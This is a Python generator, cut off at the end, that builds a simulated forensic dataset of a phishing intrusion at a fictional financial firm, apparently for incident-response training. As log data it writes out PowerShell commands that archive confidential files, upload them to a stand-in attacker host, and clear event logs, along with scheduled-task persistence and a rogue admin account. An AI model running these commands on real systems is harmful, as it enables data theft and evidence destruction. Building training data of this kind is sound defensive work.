"""Generate the synthetic Meridian Financial Services investigation dataset.

    python dataset/generator/generate.py --out dataset/meridian

Every artifact produced here is SIMULATED. Names, hosts, users, IP addresses
and domains are fictional; public-looking addresses come from the IPv4
documentation ranges (RFC 5737) and domains use the reserved ``.example``
TLD (RFC 2606). The output is deterministic: running the generator twice
produces byte-identical files, which the test-suite verifies.
"""

from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import io
import json
import sqlite3
import sys
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from evtx_writer import (  # noqa: E402
    T_HEX32,
    T_SID,
    T_UINT32,
    Element,
    S,
    Value,
    windows_event,
    write_evtx,
)
from pe_builder import (  # noqa: E402
    SCN_EXEC,
    SCN_INIT_DATA,
    SCN_READ,
    SCN_WRITE,
    PESpec,
    Section,
    build_pe,
    high_entropy_blob,
)

UTC = timezone.utc
EDT = timezone(timedelta(hours=-4), "EDT")
DAY = datetime(2026, 10, 14, tzinfo=UTC)

HOST = "WS-FIN-042"
FQDN = "WS-FIN-042.corp.meridianfs.example"
HOST_IP = "10.20.4.42"
DOMAIN = "MERIDIANFS"
USER = "jmorales"
USER_SID = "S-1-5-21-3623811015-3361044348-30300820-1104"
NEW_ACCOUNT = "svc_msync"
NEW_ACCOUNT_SID = "S-1-5-21-3623811015-3361044348-30300820-1188"
SYSTEM_SID = "S-1-5-18"
C2_IP = "203.0.113.77"
C2_DOMAIN = "cdn.meridian-sync.example"
UPLOAD_DOMAIN = "upload.meridian-sync.example"
LURE_HOST = "files.invoice-portal.example"
SAMPLE_NAME = "Q3_Vendor_Invoice.pdf.exe"
DOWNLOAD_PATH = rf"C:\Users\{USER}\Downloads\{SAMPLE_NAME}"
DROP_DIR = r"C:\ProgramData\MSync"
DROP_PATH = DROP_DIR + r"\msync.exe"
ARCHIVE_PATH = DROP_DIR + r"\q3_archive.zip"
CONFIDENTIAL_DIR = rf"C:\Users\{USER}\Documents\Confidential"
CONFIDENTIAL_FILES = [
    "Q3_Board_Financials.xlsx",
    "Client_Portfolio_Export.csv",
    "Project_Atlas_MA_Term_Sheet.docx",
    "Wire_Approval_Matrix_2026.pdf",
]
EXFIL_BYTES = 48_213_904

SECURITY_PROVIDER = ("Microsoft-Windows-Security-Auditing", "{54849625-5478-4994-A5BA-3E3B0328C30D}")
PS_PROVIDER = ("Microsoft-Windows-PowerShell", "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}")
SCM_PROVIDER = ("Service Control Manager", "{555908D1-A6D7-4695-8E1E-26931D2012F4}")
EVENTLOG_PROVIDER = ("Microsoft-Windows-Eventlog", "{FC65DDD8-D6EF-4962-83D5-6E5CFE9CE148}")

SYNTHETIC_MARKER = "TRACEFORGE-SYNTHETIC-TEST-SAMPLE :: NOT MALWARE :: Meridian Financial Services training scenario"


def t(h: int, m: int, s: int, ms: int = 0) -> datetime:
    return DAY.replace(hour=h, minute=m, second=s, microsecond=ms * 1000)


def ps_encode(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


PS_STAGE_CMD = (
    f"New-Item -ItemType Directory -Force -Path {DROP_DIR} | Out-Null; "
    f"Copy-Item -Path $env:USERPROFILE\\Downloads\\{SAMPLE_NAME} -Destination {DROP_PATH}"
)
PS_ARCHIVE_CMD = (
    f'Compress-Archive -Path "$env:USERPROFILE\\Documents\\Confidential\\*" '
    f"-DestinationPath {ARCHIVE_PATH} -Force"
)
PS_UPLOAD_CMD = (
    f"Invoke-WebRequest -Uri https://{UPLOAD_DOMAIN}/api/v2/upload -Method Post "
    f"-InFile {ARCHIVE_PATH} -UseBasicParsing"
)
PS_CLEANUP_CMD = f'Clear-EventLog -LogName "Windows PowerShell"; Remove-Item -Force {ARCHIVE_PATH}'


# ---------------------------------------------------------------------------
# PE samples
# ---------------------------------------------------------------------------


def build_suspicious_sample() -> bytes:
    spec = PESpec(
        timestamp=datetime(2026, 10, 11, 22, 14, 7, tzinfo=UTC),
        imports={
            "KERNEL32.dll": [
                "VirtualAlloc", "VirtualProtect", "OpenProcess", "WriteProcessMemory",
                "CreateRemoteThread", "GetProcAddress", "LoadLibraryA", "IsDebuggerPresent",
                "CreateFileW", "WriteFile", "Sleep", "GetTickCount",
            ],
            "ADVAPI32.dll": ["RegCreateKeyExW", "RegSetValueExW", "OpenSCManagerW", "CreateServiceW"],
            "WININET.dll": ["InternetOpenW", "InternetConnectW", "HttpOpenRequestW", "HttpSendRequestW", "InternetReadFile"],
            "SHELL32.dll": ["ShellExecuteW"],
        },
        data_strings=[
            SYNTHETIC_MARKER,
            f"https://{C2_DOMAIN}/beacon/v2",
            f"https://{UPLOAD_DOMAIN}/api/v2/upload",
            C2_IP,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) MSyncAgent/2.1",
            "powershell.exe -nop -w hidden -enc %s",
            DROP_PATH,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r'schtasks /create /tn "\Microsoft\Windows\MSync\Updater" /sc onlogon /tr "C:\ProgramData\MSync\msync.exe"',
            "Compress-Archive",
            "Invoke-WebRequest",
            "-Method Post",
            r"\Documents\Confidential\\",
        ],
        wide_strings=[
            "MeridianSyncSvc",
            DROP_PATH,
            f"{C2_DOMAIN}",
        ],
        extra_sections=[
            Section(".msync", high_entropy_blob(48 * 1024, seed=20261014), SCN_INIT_DATA | SCN_READ | SCN_WRITE | SCN_EXEC),
        ],
        overlay=b"MSYNCCFG" + high_entropy_blob(2048, seed=147),
    )
    return build_pe(spec)


def build_benign_sample() -> bytes:
    spec = PESpec(
        timestamp=datetime(2026, 3, 2, 16, 5, 41, tzinfo=UTC),
        imports={
            "KERNEL32.dll": ["GetModuleHandleW", "GetCommandLineW", "ExitProcess", "GetLastError"],
            "USER32.dll": ["MessageBoxW", "LoadIconW"],
        },
        data_strings=[
            SYNTHETIC_MARKER,
            "Meridian Financial Services - Quarterly Report Viewer",
            "Version 4.2.0 (internal build)",
            "https://intranet.meridianfs.example/reports",
        ],
        wide_strings=["Report Viewer", "Copyright (c) Meridian Financial Services (fictional)"],
    )
    return build_pe(spec)


# ---------------------------------------------------------------------------
# Windows event logs
# ---------------------------------------------------------------------------


class RecordCounter:
    def __init__(self, start: int):
        self.value = start

    def __call__(self) -> int:
        self.value += 1
        return self.value


def sec_event(rid: RecordCounter, event_id: int, ts: datetime, data: list, task: int, keywords: int = 0x8020000000000000):
    return windows_event(
        provider=SECURITY_PROVIDER[0], provider_guid=SECURITY_PROVIDER[1], event_id=event_id, timestamp=ts,
        record_id=rid(), channel="Security", computer=FQDN, task=task, keywords=keywords,
        process_id=788, thread_id=1240, event_data=data,
    )


def subject(user: str = USER, sid: str = USER_SID, logon_id: int = 0x3E7A21):
    return [
        ("SubjectUserSid", Value(T_SID, sid)),
        ("SubjectUserName", user),
        ("SubjectDomainName", DOMAIN),
        ("SubjectLogonId", f"0x{logon_id:x}"),
    ]


def proc_create(rid, ts, pid, image, cmdline, parent_image, parent_pid, user=USER, sid=USER_SID):
    return sec_event(rid, 4688, ts, subject(user, sid) + [
        ("NewProcessId", f"0x{pid:x}"),
        ("NewProcessName", image),
        ("TokenElevationType", "%%1938"),
        ("ProcessId", f"0x{parent_pid:x}"),
        ("CommandLine", cmdline),
        ("TargetUserSid", Value(T_SID, "S-1-0-0")),
        ("TargetUserName", "-"),
        ("TargetDomainName", "-"),
        ("TargetLogonId", "0x0"),
        ("ParentProcessName", parent_image),
        ("MandatoryLabel", Value(T_SID, "S-1-16-8192")),
    ], task=13312)


def object_access(rid, ts, path, process, pid):
    return sec_event(rid, 4663, ts, subject() + [
        ("ObjectServer", "Security"),
        ("ObjectType", "File"),
        ("ObjectName", path),
        ("HandleId", "0x5a4"),
        ("AccessList", "%%4416"),
        ("AccessMask", "0x1"),
        ("ProcessId", f"0x{pid:x}"),
        ("ProcessName", process),
        ("ResourceAttributes", ""),
    ], task=12800)


def wfp_connection(rid, ts, pid, app, dst_ip, dst_port, src_port):
    return sec_event(rid, 5156, ts, [
        ("ProcessID", Value(T_UINT32, pid)),
        ("Application", app),
        ("Direction", "%%14593"),
        ("SourceAddress", HOST_IP),
        ("SourcePort", str(src_port)),
        ("DestAddress", dst_ip),
        ("DestPort", str(dst_port)),
        ("Protocol", "6"),
        ("FilterRTID", "71324"),
        ("LayerName", "%%14611"),
        ("LayerRTID", "48"),
    ], task=12810)


def logon_event(rid, ts, logon_type, ip, logon_id):
    return sec_event(rid, 4624, ts, [
        ("SubjectUserSid", Value(T_SID, SYSTEM_SID)),
        ("SubjectUserName", f"{HOST}$"),
        ("SubjectDomainName", DOMAIN),
        ("SubjectLogonId", "0x3e7"),
        ("TargetUserSid", Value(T_SID, USER_SID)),
        ("TargetUserName", USER),
        ("TargetDomainName", DOMAIN),
        ("TargetLogonId", f"0x{logon_id:x}"),
        ("LogonType", str(logon_type)),
        ("LogonProcessName", "User32 "),
        ("AuthenticationPackageName", "Negotiate"),
        ("WorkstationName", HOST),
        ("IpAddress", ip),
        ("IpPort", "0"),
    ], task=12544)


def failed_logon(rid, ts, target, ip, workstation):
    return sec_event(rid, 4625, ts, [
        ("SubjectUserSid", Value(T_SID, "S-1-0-0")),
        ("SubjectUserName", "-"),
        ("SubjectDomainName", "-"),
        ("SubjectLogonId", "0x0"),
        ("TargetUserSid", Value(T_SID, "S-1-0-0")),
        ("TargetUserName", target),
        ("TargetDomainName", DOMAIN),
        ("Status", "0xc000006d"),
        ("FailureReason", "%%2313"),
        ("SubStatus", "0xc000006a"),
        ("LogonType", "3"),
        ("LogonProcessName", "NtLmSsp "),
        ("AuthenticationPackageName", "NTLM"),
        ("WorkstationName", workstation),
        ("IpAddress", ip),
        ("IpPort", "51544"),
    ], task=12544, keywords=0x8010000000000000)


def build_security_log() -> bytes:
    rid = RecordCounter(88410)
    ex = r"C:\Windows\explorer.exe"
    sample_pid, ps1_pid, drop_pid, ps2_pid = 0x1A2C, 0x1B40, 0x1C18, 0x2054
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    events = [
        logon_event(rid, t(12, 31, 4, 220), 2, "127.0.0.1", 0x3E7A21),
        proc_create(rid, t(12, 31, 9, 15), 0x0F10, ex, ex, r"C:\Windows\System32\userinit.exe", 0x0EE8),
        proc_create(rid, t(12, 32, 40, 511), 0x1104, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r'"C:\Program Files\Google\Chrome\Application\chrome.exe"', ex, 0x0F10),
        proc_create(rid, t(12, 40, 12, 87), 0x1288, r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
                    rf'"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\{USER}\Downloads\Q3_Budget_Template.xlsx"', ex, 0x0F10),
        failed_logon(rid, t(12, 58, 40, 301), "administrator", "10.20.9.15", "WS-HR-015"),
        failed_logon(rid, t(12, 58, 44, 950), "administrator", "10.20.9.15", "WS-HR-015"),
        failed_logon(rid, t(12, 58, 49, 412), "administrator", "10.20.9.15", "WS-HR-015"),
        proc_create(rid, t(13, 43, 10, 482), sample_pid, DOWNLOAD_PATH, f'"{DOWNLOAD_PATH}"', ex, 0x0F10),
        wfp_connection(rid, t(13, 43, 14, 610), sample_pid, rf"\device\harddiskvolume3\users\{USER}\downloads\{SAMPLE_NAME.lower()}", C2_IP, 443, 52811),
        proc_create(rid, t(13, 43, 31, 107), ps1_pid, ps, f"powershell.exe -nop -w hidden -enc {ps_encode(PS_STAGE_CMD)}", DOWNLOAD_PATH, sample_pid),
        proc_create(rid, t(13, 44, 6, 733), drop_pid, DROP_PATH, f'"{DROP_PATH}" --install', DOWNLOAD_PATH, sample_pid),
        sec_event(rid, 4698, t(13, 44, 15, 240), subject() + [
            ("TaskName", r"\Microsoft\Windows\MSync\Updater"),
            ("TaskContent", f'<Task><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Actions><Exec><Command>{DROP_PATH}</Command><Arguments>--background</Arguments></Exec></Actions></Task>'),
        ], task=12804),
        sec_event(rid, 4720, t(13, 44, 58, 19), [
            ("TargetUserName", NEW_ACCOUNT),
            ("TargetDomainName", HOST),
            ("TargetSid", Value(T_SID, NEW_ACCOUNT_SID)),
        ] + subject() + [
            ("PrivilegeList", "-"),
            ("SamAccountName", NEW_ACCOUNT),
            ("DisplayName", "%%1793"),
            ("UserPrincipalName", "-"),
            ("UserAccountControl", "%%2080 %%2082 %%2084"),
        ], task=13824),
        sec_event(rid, 4732, t(13, 45, 3, 552), [
            ("MemberName", "-"),
            ("MemberSid", Value(T_SID, NEW_ACCOUNT_SID)),
            ("TargetUserName", "Administrators"),
            ("TargetDomainName", "Builtin"),
            ("TargetSid", Value(T_SID, "S-1-5-32-544")),
        ] + subject() + [("PrivilegeList", "-")], task=13826),
    ]
    access_times = [t(13, 52, 10, 118), t(13, 53, 2, 640), t(13, 54, 37, 9), t(13, 55, 47, 381)]
    for ts, name in zip(access_times, CONFIDENTIAL_FILES):
        events.append(object_access(rid, ts, rf"{CONFIDENTIAL_DIR}\{name}", DROP_PATH, drop_pid))
    events += [
        proc_create(rid, t(13, 57, 2, 455), ps2_pid, ps, f"powershell.exe -nop -w hidden -enc {ps_encode(PS_ARCHIVE_CMD + '; ' + PS_UPLOAD_CMD)}", DROP_PATH, drop_pid),
    ]
    for ts, name in zip([t(13, 57, 5, 10), t(13, 57, 5, 220), t(13, 57, 5, 431), t(13, 57, 5, 655)], CONFIDENTIAL_FILES):
        events.append(object_access(rid, ts, rf"{CONFIDENTIAL_DIR}\{name}", ps, ps2_pid))
    events += [
        wfp_connection(rid, t(13, 58, 6, 2), ps2_pid, r"\device\harddiskvolume3\windows\system32\windowspowershell\v1.0\powershell.exe", C2_IP, 443, 53120),
        proc_create(rid, t(14, 3, 9, 870), 0x2210, ps, f"powershell.exe -nop -w hidden -enc {ps_encode(PS_CLEANUP_CMD)}", DROP_PATH, drop_pid),
        proc_create(rid, t(14, 15, 22, 64), 0x2390, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument https://intranet.meridianfs.example/it/report-phishing', ex, 0x0F10),
        sec_event(rid, 4647, t(14, 31, 40, 5), [
            ("TargetUserSid", Value(T_SID, USER_SID)), ("TargetUserName", USER),
            ("TargetDomainName", DOMAIN), ("TargetLogonId", "0x3e7a21"),
        ], task=12545),
    ]
    events.sort(key=lambda e: e.timestamp)
    # renumber in chronological order so EventRecordID is monotonic
    return write_evtx(_renumber(events, 88411))


def _renumber(events, start):
    # EventRecordID is the 9th child of <System>; rebuild with ordered IDs
    out = []
    for offset, ev in enumerate(events):
        system = ev.root.children[0]
        for child in system.children:
            if isinstance(child, Element) and child.name == "EventRecordID":
                child.children[0].value = start + offset
        out.append(ev)
    return out


def build_powershell_log() -> bytes:
    rid = RecordCounter(5100)

    def script_block(ts, text, level=5, pid=0x1B40):
        import uuid
        block_id = str(uuid.uuid5(uuid.NAMESPACE_URL, f"meridian/{ts.isoformat()}"))
        return windows_event(
            provider=PS_PROVIDER[0], provider_guid=PS_PROVIDER[1], event_id=4104, timestamp=ts, record_id=rid(),
            channel="Microsoft-Windows-PowerShell/Operational", computer=FQDN, level=level, task=2, opcode=15,
            version=1, keywords=0x0, process_id=pid, thread_id=4412, user_sid=USER_SID,
            event_data=[
                ("MessageNumber", "1"), ("MessageTotal", "1"), ("ScriptBlockText", text),
                ("ScriptBlockId", block_id), ("Path", ""),
            ],
        )

    events = [
        script_block(t(12, 47, 30, 10), "Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 5", pid=0x0D44),
        script_block(t(13, 43, 32, 15), PS_STAGE_CMD, level=3),
        script_block(t(13, 57, 3, 301), PS_ARCHIVE_CMD, level=3, pid=0x2054),
        script_block(t(13, 58, 4, 772), PS_UPLOAD_CMD, level=3, pid=0x2054),
        script_block(t(14, 3, 10, 412), PS_CLEANUP_CMD, level=3, pid=0x2210),
    ]
    return write_evtx(events)


def build_system_log() -> bytes:
    rid = RecordCounter(30220)

    def scm(event_id, ts, data, keywords=0x8080000000000000, level=4):
        return windows_event(
            provider=SCM_PROVIDER[0], provider_guid=SCM_PROVIDER[1], event_id=event_id, timestamp=ts,
            record_id=rid(), channel="System", computer=FQDN, level=level, keywords=keywords,
            process_id=772, thread_id=2208, user_sid=SYSTEM_SID if event_id == 7045 else None, event_data=data,
        )

    events = [
        windows_event(provider="EventLog", provider_guid=None, event_id=6005, timestamp=t(12, 29, 51, 2), record_id=rid(),
                      channel="System", computer=FQDN, level=4, keywords=0x80000000000000, process_id=0, thread_id=0,
                      event_data=[]),
        scm(7036, t(12, 30, 5, 400), [("param1", "Windows Update"), ("param2", "running")]),
        scm(7045, t(13, 44, 40, 117), [
            ("ServiceName", "MeridianSyncSvc"),
            ("ImagePath", f'"{DROP_PATH}" --service'),
            ("ServiceType", "user mode service"),
            ("StartType", "auto start"),
            ("AccountName", "LocalSystem"),
        ]),
        scm(7036, t(13, 44, 41, 3), [("param1", "MeridianSyncSvc"), ("param2", "running")]),
        windows_event(
            provider=EVENTLOG_PROVIDER[0], provider_guid=EVENTLOG_PROVIDER[1], event_id=104, timestamp=t(14, 3, 11, 96),
            record_id=rid(), channel="System", computer=FQDN, level=4, task=104, keywords=0x8000000000000000,
            process_id=1356, thread_id=6120, user_sid=USER_SID,
            user_data=Element("LogFileCleared", [("xmlns", S("http://manifests.microsoft.com/win/2004/08/windows/eventlog"))], [
                Element("SubjectUserName", [], [S(USER)]),
                Element("SubjectDomainName", [], [S(DOMAIN)]),
                Element("Channel", [], [S("Windows PowerShell")]),
                Element("BackupPath", [], [S("")]),
            ]),
        ),
        scm(7036, t(14, 40, 2, 811), [("param1", "Windows Update"), ("param2", "stopped")]),
    ]
    return write_evtx(events)


# ---------------------------------------------------------------------------
# Chromium history
# ---------------------------------------------------------------------------

WEBKIT_EPOCH = datetime(1601, 1, 1, tzinfo=UTC)


def webkit(ts: datetime) -> int:
    delta = ts - WEBKIT_EPOCH
    return (delta.days * 86400 + delta.seconds) * 1_000_000 + delta.microseconds


CHROMIUM_SCHEMA = """
CREATE TABLE meta(key LONGVARCHAR NOT NULL UNIQUE PRIMARY KEY, value LONGVARCHAR);
CREATE TABLE urls(id INTEGER PRIMARY KEY AUTOINCREMENT, url LONGVARCHAR, title LONGVARCHAR,
  visit_count INTEGER DEFAULT 0 NOT NULL, typed_count INTEGER DEFAULT 0 NOT NULL,
  last_visit_time INTEGER NOT NULL, hidden INTEGER DEFAULT 0 NOT NULL);
CREATE TABLE visits(id INTEGER PRIMARY KEY AUTOINCREMENT, url INTEGER NOT NULL, visit_time INTEGER NOT NULL,
  from_visit INTEGER, external_referrer_url TEXT, transition INTEGER DEFAULT 0 NOT NULL, segment_id INTEGER,
  visit_duration INTEGER DEFAULT 0 NOT NULL, incremented_omnibox_typed_score BOOLEAN DEFAULT FALSE NOT NULL,
  opener_visit INTEGER, originator_cache_guid TEXT, originator_visit_id INTEGER, originator_from_visit INTEGER,
  originator_opener_visit INTEGER, is_known_to_sync BOOLEAN DEFAULT FALSE NOT NULL,
  consider_for_ntp_most_visited BOOLEAN DEFAULT FALSE NOT NULL, visited_link_id INTEGER DEFAULT 0 NOT NULL,
  app_id TEXT);
CREATE TABLE downloads (id INTEGER PRIMARY KEY, guid VARCHAR NOT NULL, current_path LONGVARCHAR NOT NULL,
  target_path LONGVARCHAR NOT NULL, start_time INTEGER NOT NULL, received_bytes INTEGER NOT NULL,
  total_bytes INTEGER NOT NULL, state INTEGER NOT NULL, danger_type INTEGER NOT NULL,
  interrupt_reason INTEGER NOT NULL, hash BLOB NOT NULL, end_time INTEGER NOT NULL, opened INTEGER NOT NULL,
  last_access_time INTEGER NOT NULL, transient INTEGER NOT NULL, referrer VARCHAR NOT NULL,
  site_url VARCHAR NOT NULL, embedder_download_data VARCHAR NOT NULL, tab_url VARCHAR NOT NULL,
  tab_referrer_url VARCHAR NOT NULL, http_method VARCHAR NOT NULL, by_ext_id VARCHAR NOT NULL,
  by_ext_name VARCHAR NOT NULL, by_web_app_id VARCHAR NOT NULL, etag VARCHAR NOT NULL,
  last_modified VARCHAR NOT NULL, mime_type VARCHAR(255) NOT NULL, original_mime_type VARCHAR(255) NOT NULL);
CREATE TABLE downloads_url_chains (id INTEGER NOT NULL, chain_index INTEGER NOT NULL, url LONGVARCHAR NOT NULL,
  PRIMARY KEY (id, chain_index));
"""

# Chromium page transition core types: 0 LINK, 1 TYPED, 2 AUTO_BOOKMARK, 8 RELOAD ...
VISITS = [
    # (time, url, title, transition)
    (t(12, 33, 1, 400), "https://intranet.meridianfs.example/", "Meridian Intranet - Home", 1),
    (t(12, 35, 44, 102), "https://news.example.com/markets/today", "Markets Today | Example News", 1),
    (t(12, 39, 50, 7), "https://intranet.meridianfs.example/finance/templates", "Finance Templates", 0),
    (t(13, 38, 2, 905), "https://mail.meridianfs.example/owa/#inbox", "Mail - Jordan Morales - Outlook Web", 1),
    (t(13, 41, 20, 330), "https://mail.meridianfs.example/owa/#message/AAMkADQ3MjE2",
     "RE: Overdue Q3 vendor invoice - action required", 0),
    (t(13, 41, 44, 871), f"https://{LURE_HOST}/d/7f3a9c2e/{SAMPLE_NAME}", "", 0),
    (t(13, 48, 15, 0), "https://mail.meridianfs.example/owa/#inbox", "Mail - Jordan Morales - Outlook Web", 8),
    (t(14, 15, 22, 900), "https://intranet.meridianfs.example/it/report-phishing", "Report a Suspicious Email - IT Security", 0),
]


def build_chromium_history(sample_size: int, sample_sha256: str) -> bytes:
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "History"
        con = sqlite3.connect(path)
        con.executescript(CHROMIUM_SCHEMA)
        con.execute("INSERT INTO meta VALUES ('version', '69'), ('last_compatible_version', '16')")
        url_ids: dict[str, int] = {}
        for ts, url, title, transition in VISITS:
            if url not in url_ids:
                cur = con.execute(
                    "INSERT INTO urls(url, title, visit_count, typed_count, last_visit_time, hidden) VALUES (?,?,?,?,?,0)",
                    (url, title, 0, 1 if transition == 1 else 0, webkit(ts)),
                )
                url_ids[url] = cur.lastrowid
            con.execute(
                "UPDATE urls SET visit_count = visit_count + 1, last_visit_time = ? WHERE id = ?",
                (webkit(ts), url_ids[url]),
            )
            con.execute(
                "INSERT INTO visits(url, visit_time, from_visit, transition, visit_duration) VALUES (?,?,0,?,?)",
                (url_ids[url], webkit(ts), transition | 0x30000000, 4_500_000),
            )

        downloads = [
            dict(
                id=1, guid="5a1c7e0e-3c55-4b6d-9a51-0f6f6a1d2b11",
                target=rf"C:\Users\{USER}\Downloads\Q3_Budget_Template.xlsx",
                start=t(12, 39, 58, 210), end=t(12, 39, 59, 4), size=84_220,
                url="https://intranet.meridianfs.example/finance/templates/Q3_Budget_Template.xlsx",
                referrer="https://intranet.meridianfs.example/finance/templates",
                tab="https://intranet.meridianfs.example/finance/templates",
                mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", danger=0,
                sha=hashlib.sha256(b"synthetic-budget-template").digest(),
            ),
            dict(
                id=2, guid="b9e3f27d-81a4-4d0c-bc2b-6c9d84f1e0a7", target=DOWNLOAD_PATH,
                start=t(13, 41, 45, 102), end=t(13, 41, 49, 668), size=sample_size,
                url=f"https://{LURE_HOST}/d/7f3a9c2e/{SAMPLE_NAME}",
                referrer="https://mail.meridianfs.example/owa/",
                tab="https://mail.meridianfs.example/owa/#message/AAMkADQ3MjE2",
                mime="application/octet-stream", danger=6, sha=bytes.fromhex(sample_sha256),
            ),
        ]
        for d in downloads:
            con.execute(
                """INSERT INTO downloads VALUES (?,?,?,?,?,?,?,1,?,0,?,?,1,?,0,?,?,'',?,?,'GET','','','','','',?,?)""",
                (
                    d["id"], d["guid"], d["target"], d["target"], webkit(d["start"]), d["size"], d["size"],
                    d["danger"], d["sha"], webkit(d["end"]), webkit(d["end"] + timedelta(seconds=3)),
                    d["referrer"], "https://" + d["url"].split("/")[2] + "/", d["tab"], d["referrer"],
                    d["mime"], d["mime"],
                ),
            )
            con.execute("INSERT INTO downloads_url_chains VALUES (?,0,?)", (d["id"], d["url"]))
        con.commit()
        con.execute("VACUUM")
        con.close()
        return path.read_bytes()


# ---------------------------------------------------------------------------
# Network, DNS and EDR logs
# ---------------------------------------------------------------------------


def build_firewall_csv() -> bytes:
    rows = [
        (t(12, 32, 44, 0), "allow", "tcp", 51002, "198.51.100.24", 443, 18_204, 412_880, "ssl", "outbound-web"),
        (t(12, 35, 45, 0), "allow", "tcp", 51010, "192.0.2.80", 443, 6_512, 1_201_772, "ssl", "outbound-web"),
        (t(13, 38, 3, 0), "allow", "tcp", 51244, "198.51.100.24", 443, 22_841, 840_119, "ssl", "outbound-web"),
        (t(13, 41, 45, 0), "allow", "tcp", 51290, "192.0.2.145", 443, 3_208, 0, "ssl", "outbound-web"),
        (t(13, 43, 14, 0), "allow", "tcp", 52811, C2_IP, 443, 1_844, 6_301, "ssl", "outbound-web"),
        (t(13, 48, 14, 0), "allow", "tcp", 52866, C2_IP, 443, 1_790, 512, "ssl", "outbound-web"),
        (t(13, 53, 15, 0), "allow", "tcp", 52930, C2_IP, 443, 1_802, 512, "ssl", "outbound-web"),
        (t(13, 58, 6, 0), "allow", "tcp", 53120, C2_IP, 443, EXFIL_BYTES, 9_844, "ssl", "outbound-web"),
        (t(14, 3, 16, 0), "allow", "tcp", 53188, C2_IP, 443, 1_811, 512, "ssl", "outbound-web"),
        (t(14, 15, 23, 0), "allow", "tcp", 53301, "198.51.100.24", 443, 9_120, 155_032, "ssl", "outbound-web"),
        (t(14, 22, 40, 0), "deny", "tcp", 53390, C2_IP, 443, 0, 0, "ssl", "ir-block-203.0.113.77"),
    ]
    # Received byte counts for the deny row are zero because the session never established.
    buf = io.StringIO()
    w = csv.writer(buf, lineterminator="\n")
    w.writerow(["timestamp_utc", "device", "action", "protocol", "src_ip", "src_host", "src_port",
                "dst_ip", "dst_port", "bytes_sent", "bytes_received", "app", "rule"])
    for ts, action, proto, sport, dip, dport, sent, recv, app, rule in rows:
        w.writerow([ts.strftime("%Y-%m-%dT%H:%M:%SZ"), "fw-edge-01", action, proto, HOST_IP, HOST, sport,
                    dip, dport, sent, recv, app, rule])
    return buf.getvalue().encode("utf-8")


def build_dns_log() -> bytes:
    queries = [
        (t(12, 32, 43, 120), "www.google.example", "A", "NOERROR", "192.0.2.10"),
        (t(12, 33, 0, 870), "intranet.meridianfs.example", "A", "NOERROR", "10.20.1.15"),
        (t(12, 35, 43, 990), "news.example.com", "A", "NOERROR", "192.0.2.80"),
        (t(13, 38, 2, 410), "mail.meridianfs.example", "A", "NOERROR", "198.51.100.24"),
        (t(13, 41, 44, 702), LURE_HOST, "A", "NOERROR", "192.0.2.145"),
        (t(13, 43, 12, 204), C2_DOMAIN, "A", "NOERROR", C2_IP),
        (t(13, 48, 13, 880), C2_DOMAIN, "A", "NOERROR", C2_IP),
        (t(13, 53, 14, 951), C2_DOMAIN, "A", "NOERROR", C2_IP),
        (t(13, 58, 5, 310), UPLOAD_DOMAIN, "A", "NOERROR", C2_IP),
        (t(14, 3, 15, 777), C2_DOMAIN, "A", "NOERROR", C2_IP),
        (t(14, 15, 22, 410), "intranet.meridianfs.example", "A", "NOERROR", "10.20.1.15"),
    ]
    lines = [
        "# Meridian Financial Services - internal resolver query log (SIMULATED DATA)",
        "# format: <local timestamp with UTC offset> CLIENT <ip> QUERY <type> <name> RESPONSE <rcode> <answer>",
    ]
    for ts, name, qtype, rcode, answer in queries:
        local = ts.astimezone(EDT)
        stamp = local.strftime("%Y-%m-%d %H:%M:%S.") + f"{local.microsecond // 1000:03d} -0400"
        lines.append(f"{stamp} CLIENT {HOST_IP} QUERY {qtype} {name} RESPONSE {rcode} {answer}")
        if name == LURE_HOST:
            # A truncated line, as produced when the resolver log rotated mid-write.
            lines.append("2026-10-14 09:41:44.9")
    return ("\n".join(lines) + "\n").encode("utf-8")


def build_edr_json(sample_sha256: str, sample_size: int) -> bytes:
    def rec(ts, event_type, process, path=None, **extra):
        local = ts.astimezone(EDT)
        item = {
            "event_time": local.isoformat(timespec="milliseconds"),
            "host": HOST,
            "user": f"{DOMAIN}\\{USER}",
            "event_type": event_type,
            "process_name": process.split("\\")[-1],
            "process_path": process,
        }
        if path:
            item["file_path"] = path
        item.update(extra)
        return item

    chrome = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    events = [
        rec(t(12, 39, 59, 50), "file_create", chrome, rf"C:\Users\{USER}\Downloads\Q3_Budget_Template.xlsx",
            sha256=hashlib.sha256(b"synthetic-budget-template").hexdigest(), size=84_220),
        rec(t(13, 41, 49, 702), "file_create", chrome, DOWNLOAD_PATH, sha256=sample_sha256, size=sample_size,
            zone_identifier={"ZoneId": 3, "ReferrerUrl": "https://mail.meridianfs.example/owa/",
                             "HostUrl": f"https://{LURE_HOST}/d/7f3a9c2e/{SAMPLE_NAME}"}),
        rec(t(13, 44, 2, 318), "file_create", ps, DROP_PATH, sha256=sample_sha256, size=sample_size),
    ]
    for ts, name in zip([t(13, 52, 10, 120), t(13, 53, 2, 641), t(13, 54, 37, 11), t(13, 55, 47, 383)], CONFIDENTIAL_FILES):
        events.append(rec(ts, "file_read", DROP_PATH, rf"{CONFIDENTIAL_DIR}\{name}"))
    events += [
        rec(t(13, 57, 19, 904), "file_create", ps, ARCHIVE_PATH, size=EXFIL_BYTES - 10_240),
        rec(t(14, 3, 12, 30), "file_delete", ps, ARCHIVE_PATH),
    ]
    doc = {
        "export": {
            "product": "MeridianEDR (fictional)",
